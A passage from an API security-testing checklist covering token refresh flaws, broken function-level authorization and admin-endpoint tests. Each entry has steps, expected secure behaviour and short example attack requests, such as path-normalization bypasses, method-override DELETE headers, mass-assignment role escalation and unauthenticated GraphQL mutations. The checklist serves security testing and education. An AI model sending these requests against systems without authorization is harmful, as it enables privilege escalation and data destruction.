**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Login and get tokens<br>2. Logout<br>3. Try using refresh token

**Expected Result:** Should invalidate refresh token on logout

**Payload / PoC Example:**

```
Refresh token works after logout
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Burp Suite

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0175 — Stolen Refresh Token Usage
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Use refresh token from IP A<br>2. Use same token from IP B<br>3. Check if both work

**Expected Result:** Should detect anomalies and invalidate suspicious tokens

**Payload / PoC Example:**

```
Token works from multiple IPs simultaneously
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Manual

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0176 — Refresh Token Without Rate Limiting
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Rapidly request new access tokens<br>2. Send 1000 refresh requests<br>3. Check limiting

**Expected Result:** Should rate limit refresh requests

**Payload / PoC Example:**

```
Unlimited refresh requests
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Burp Intruder

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API4:2023 Unrestricted Resource Consumption

---

## API-0177 — Access Token After Refresh Token Compromised
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Report refresh token compromise<br>2. Check if issued access tokens revoked<br>3. Test invalidation

**Expected Result:** Should revoke all related access tokens

**Payload / PoC Example:**

```
Old access tokens still valid
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Manual

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0178 — Refresh Token CSRF
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Craft malicious refresh request<br>2. Execute from victim browser<br>3. Check if new token issued

**Expected Result:** Should validate origin and use CSRF protection

**Payload / PoC Example:**

```
Auto-refresh to steal new tokens
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Burp Suite

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0179 — Refresh Token in URL
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Check if refresh sent in URL/query params<br>2. Review logs<br>3. Check browser history

**Expected Result:** Should send in request body with secure POST

**Payload / PoC Example:**

```
GET /refresh?token=secret
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Manual

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API3:2023 Broken Object Property Level Authorization

---

## API-0180 — Weak Refresh Token Entropy
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Collect multiple refresh tokens<br>2. Analyze patterns<br>3. Test predictability

**Expected Result:** Should use cryptographically secure random generation

**Payload / PoC Example:**

```
Sequential or predictable tokens
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Burp Sequencer

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0181 — No Refresh Token Family Tracking
**Phase:** 5-Session · **Category:** Token Management · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Token Refresh — Refresh/access-token endpoint

**Test Steps:** 1. Reuse old refresh token<br>2. Try replay attacks<br>3. Check detection

**Expected Result:** Should implement refresh token families and detect reuse

**Payload / PoC Example:**

```
Old refresh tokens still accepted
```

**Impact:** Token refresh/revocation flaw prolongs stolen-token validity

**Tools:** Manual

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0182 — Unauthorized Field Access via Parameter
**Phase:** 6-Authorization · **Category:** Authorization · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read Resource — Role/tenant-scoped endpoint &amp; identifiers

**Test Steps:** 1. Add fields parameter to request sensitive data<br>2. Test various field names<br>3. Check response

**Expected Result:** Should filter based on user permissions

**Payload / PoC Example:**

```
GET /api/users/1?fields=password,ssn,salary
```

**Impact:** Privilege escalation / horizontal-vertical access control bypass

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0183 — GraphQL Broken Field-Level Authorization
**Phase:** 6-Authorization · **Category:** Authorization · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role/tenant-scoped endpoint &amp; identifiers

**Test Steps:** 1. Query restricted fields<br>2. Test different roles<br>3. Check authorization per field

**Expected Result:** Should enforce authz in every resolver

**Payload / PoC Example:**

```
Query password or internal fields as regular user
```

**Impact:** Privilege escalation / horizontal-vertical access control bypass

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0184 — GraphQL Type Confusion/Unauthorized Access
**Phase:** 6-Authorization · **Category:** Authorization · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role/tenant-scoped endpoint &amp; identifiers

**Test Steps:** 1. Query internal types<br>2. Access admin types as user<br>3. Test union/interface types

**Expected Result:** Should restrict accessible types per role

**Payload / PoC Example:**

```
Access AdminUser type as regular user
```

**Impact:** Privilege escalation / horizontal-vertical access control bypass

**Tools:** GraphQL Voyager

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0185 — GraphQL Mutation Without Authorization
**Phase:** 6-Authorization · **Category:** Authorization · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role/tenant-scoped endpoint &amp; identifiers

**Test Steps:** 1. Execute mutations as unauthenticated<br>2. Test privileged mutations<br>3. Check authorization

**Expected Result:** Should require authentication for all mutations

**Payload / PoC Example:**

```
mutation {deleteUser(id:1)} without auth
```

**Impact:** Privilege escalation / horizontal-vertical access control bypass

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0186 — Server-Sent Events (SSE) Authorization Bypass
**Phase:** 6-Authorization · **Category:** Authorization · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role/tenant-scoped endpoint &amp; identifiers

**Test Steps:** 1. Connect to SSE endpoint without auth<br>2. Use other user's EventSource connection<br>3. Check if events from other users received

**Expected Result:** SSE endpoints require auth; events scoped to authenticated user only

**Payload / PoC Example:**

```
GET /api/events  (no Authorization header)
EventSource('/api/events?userId=victim')
```

**Impact:** Privilege escalation / horizontal-vertical access control bypass

**Tools:** Burp Suite, Browser DevTools

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API2:2023 Broken Authentication

---

## API-0187 — Regular user accessing admin endpoint
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GET Privileged/admin function endpoint

**Test Steps:** 1. Login as low-priv user<br>2. Hit /api/admin/* endpoints discovered in recon<br>3. Try method swap (GET-&gt;DELETE)

**Expected Result:** Validate admin role per request

**Payload / PoC Example:**

```
GET /api/admin/users with user JWT
```

**Impact:** Full app compromise

**Tools:** Burp Suite,Autorize

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0188 — Path normalization bypass
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Privileged/admin function endpoint

**Test Steps:** 1. Try /admin/..;/users /admin%2fusers /admin/./users /aDmin/users /admin//users<br>2. Test header bypass: X-Original-URL: /admin/users

**Expected Result:** Normalize before authz check

**Payload / PoC Example:**

```
GET /admin/..;/users
```

**Impact:** Reach gated admin paths

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0189 — HTTP method override bypass
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** PUT Privileged/admin function endpoint

**Test Steps:** 1. POST /admin/users with X-HTTP-Method-Override: DELETE<br>2. Or use ?_method=DELETE<br>3. Verify destructive action

**Expected Result:** Disable method override

**Payload / PoC Example:**

```
X-HTTP-Method-Override: DELETE
```

**Impact:** Destructive admin action as user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0190 — Delete Without Authentication
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Delete Resource — Privileged/admin function endpoint

**Test Steps:** 1. Remove auth token<br>2. Send DELETE request<br>3. Check if deleted

**Expected Result:** Should return 401 Unauthorized

**Payload / PoC Example:**

```
DELETE /api/posts/1 without Authorization
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API2:2023 Broken Authentication

---

## API-0191 — Mass Delete Without Confirmation
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delete Resource — Privileged/admin function endpoint

**Test Steps:** 1. Send delete request with array of IDs<br>2. Try deleting all records<br>3. Check validation

**Expected Result:** Should require confirmation and limit batch size

**Payload / PoC Example:**

```
DELETE /api/posts with body: {"ids":[1,2,3,...,1000]}
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0192 — Soft Delete Not Implemented
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Delete Resource — Privileged/admin function endpoint

**Test Steps:** 1. Delete resource<br>2. Check if permanently deleted<br>3. Verify no recovery option

**Expected Result:** Should implement soft delete for important data

**Payload / PoC Example:**

```
Hard delete without recovery
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0193 — Delete Without Cascade Check
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Delete Resource — Privileged/admin function endpoint

**Test Steps:** 1. Delete parent resource<br>2. Check if orphaned child records exist<br>3. Test data integrity

**Expected Result:** Should handle cascading properly or prevent deletion

**Payload / PoC Example:**

```
Delete user without handling their orders
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0194 — Delete Admin/System Resources
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Delete Resource — Privileged/admin function endpoint

**Test Steps:** 1. Try deleting admin users<br>2. Attempt to delete system resources<br>3. Test protection on critical data

**Expected Result:** Should prevent deletion of protected resources

**Payload / PoC Example:**

```
DELETE /api/users/1 (admin user)
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0195 — Parameter Pollution in Delete
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Delete Resource — Privileged/admin function endpoint

**Test Steps:** 1. Send multiple ID parameters<br>2. Check which gets deleted<br>3. Test for unexpected behavior

**Expected Result:** Should handle gracefully and consistently

**Payload / PoC Example:**

```
DELETE /api/posts?id=1&id=2&id=3
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0196 — Admin Panel Without Authentication
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Access admin endpoints without token<br>2. Test /admin/* paths<br>3. Check authorization

**Expected Result:** Should require authentication and admin role

**Payload / PoC Example:**

```
GET /api/admin/users without Authorization
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API2:2023 Broken Authentication

---

## API-0197 — BFLA - Regular User Accessing Admin
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Login as regular user<br>2. Try admin endpoints<br>3. Test role escalation

**Expected Result:** Should validate admin role

**Payload / PoC Example:**

```
GET /api/admin/users (with regular user token)
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0198 — IDOR in Admin User Management
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Admin modifies User A<br>2. Change userId to admin's own ID<br>3. Test self-modification prevention

**Expected Result:** Should prevent admin from escalating own privileges

**Payload / PoC Example:**

```
PUT /admin/users/1/role (admin modifying themselves)
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0199 — Admin Function Without Audit Log
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Perform admin actions<br>2. Check if logged<br>3. Verify log completeness

**Expected Result:** Should log all admin actions with timestamp and user

**Payload / PoC Example:**

```
Admin delete without logging
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0200 — Mass User Data Export Without Limit
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Export all users<br>2. Request millions of records<br>3. Check if limited

**Expected Result:** Should implement pagination and limits

**Payload / PoC Example:**

```
GET /admin/export-users?limit=9999999
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0201 — Admin Function CSRF
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Craft malicious admin action<br>2. Trick admin into executing<br>3. Check if action performed

**Expected Result:** Should validate CSRF tokens on admin actions

**Payload / PoC Example:**

```
Auto-submit form to delete users
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API2:2023 Broken Authentication

---

## API-0202 — Role Manipulation via Mass Assignment
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Update user profile<br>2. Add role/isAdmin parameter<br>3. Check if escalated

**Expected Result:** Should not allow role changes via user endpoints

**Payload / PoC Example:**

```
PUT /profile {"name":"John", "role":"admin"}
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0203 — Debug/Test Endpoints in Production
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Access /debug /test /swagger endpoints<br>2. Check for exposed info<br>3. Test functionality

**Expected Result:** Should disable debug endpoints in production

**Payload / PoC Example:**

```
GET /api/debug, /api/test, /api/swagger
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** DirBuster/ffuf

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0204 — Admin Panel Path Disclosure
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Enumerate common admin paths<br>2. Use wordlists<br>3. Check response codes

**Expected Result:** Should not expose admin endpoints or use obscure paths

**Payload / PoC Example:**

```
Test /admin, /administrator, /manage, /console
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** DirBuster/ffuf

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0205 — Privilege Escalation via API Parameter
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Send request with role parameter<br>2. Try different privilege levels<br>3. Check if accepted

**Expected Result:** Should ignore privilege parameters from user input

**Payload / PoC Example:**

```
POST /users {"role":"superadmin"}
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0206 — Admin Endpoint Exposed via HTTP OPTIONS
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Send OPTIONS to every admin path<br>2. Check Allow header reveals hidden admin methods<br>3. Exploit unlisted admin functions

**Expected Result:** OPTIONS returns only documented, authorized methods

**Payload / PoC Example:**

```
OPTIONS /api/admin/users  →  Allow: GET,POST,PUT,DELETE,PATCH
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite, curl

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0207 — Insecure Direct Function Invocation via Admin
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Enumerate RPC-style admin endpoints (/admin/run, /admin/exec)<br>2. Invoke internal admin functions directly<br>3. Test arbitrary code execution via admin panel

**Expected Result:** Admin functions are role-gated and audited; no direct RPC exposure

**Payload / PoC Example:**

```
POST /admin/run {"command":"getSystemInfo"}
POST /admin/exec {"func":"exportDB"}
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite, ffuf

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0208 — BFLA - Horizontal Privilege Escalation
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privileged/admin function endpoint

**Test Steps:** 1. Login as regular user<br><br>2. Access another user's admin functions<br><br>3. Try modifying other user's settings<br><br>4. Check if cross-user actions allowed

**Expected Result:** Should prevent users from affecting other users' data

**Payload / PoC Example:**

```
PUT /api/users/2/settings (as user 1)
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0209 — BFLA - Vertical Privilege Escalation
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Privileged/admin function endpoint

**Test Steps:** 1. Login as regular user<br><br>2. Access admin-only endpoints<br><br>3. Try administrative functions<br><br>4. Check if role validated

**Expected Result:** Should validate role for each endpoint

**Payload / PoC Example:**

```
GET /api/admin/users (as regular user)
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

